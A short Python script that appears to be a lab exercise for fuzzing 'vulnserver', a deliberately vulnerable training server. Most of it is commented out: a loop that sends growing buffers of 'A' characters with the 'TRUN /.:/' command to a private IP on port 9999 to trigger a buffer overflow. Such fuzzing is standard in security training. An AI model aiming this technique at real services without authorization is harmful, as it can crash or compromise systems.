'''
Author: Harry
Licenced to: ABC Company
***********Thanks for reading**********
'''

import socket 
import sys

buffer = ["A"]
counter =  100
print(len(buffer))
buffer.append("A"*counter)
counter=counter+200
print(buffer)
# while len(buffer) <= 30:
# 	buffer.append("A"*counter)
# 	counter=counter+200
    

# for string in buffer:
# 	print( "Fuzzing vulnserver with %s bytes " % len(string))
# 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# 	connect=s.connect(('192.168.43.112',9999))
# 	s.send(('TRUN /.:/' + string))
# 	s.close()
